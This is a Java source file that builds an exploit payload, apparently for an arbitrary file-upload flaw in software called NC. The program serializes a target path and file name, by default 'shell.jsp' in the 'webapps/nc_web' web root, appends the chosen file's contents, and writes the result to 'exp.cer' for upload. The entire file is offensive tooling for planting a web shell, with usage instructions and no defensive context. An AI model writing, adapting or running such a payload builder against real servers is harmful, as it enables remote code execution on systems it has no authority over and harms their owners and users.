package com.sorry.nc;

import java.io.File;

public class NCFileUploadEXP {
    public static void main(String[] args) throws java.io.IOException {
        String filename="shell.jsp",targetfilepath="webapps/nc_web";
        if(args.length <= 0){
            System.out.println("Plz choose the file u wanna upload");
            System.out.println("Usage:java -jar NCFIleUploadEXP.jar [filename] [path] \n"
                    + "if u did not specify the path,it will be upload to webapps/nc_web(the webroot dir)"
            );
        }else{
            filename = args[0];
            if(args.length > 1){
                targetfilepath = args[1];
            }
            java.util.Map metainfo = new java.util.HashMap<>();
            metainfo.put("TARGET_FILE_PATH",targetfilepath);
            metainfo.put("FILE_NAME",filename);
            java.io.ByteArrayOutputStream bout = new java.io.ByteArrayOutputStream();
            java.io.ObjectOutputStream os = new java.io.ObjectOutputStream(bout);
            os.writeObject(metainfo);
            String filepath = System.getProperty("user.dir")+ File.separator+args[0];
            //java.io.InputStream is = NCFileUploadEXP.class.getResourceAsStream(filename);
            java.io.InputStream is = new java.io.BufferedInputStream(new java.io.FileInputStream(filepath));
            byte[] buf = new byte[1024];
            int len = 0;
            while((len=is.read(buf))!= sun.nio.ch.IOStatus.EOF){
                bout.write(buf,0,len);
            }
            java.io.FileOutputStream fileos = new java.io.FileOutputStream("exp.cer");
            fileos.write(bout.toByteArray());
        }
        }

    }

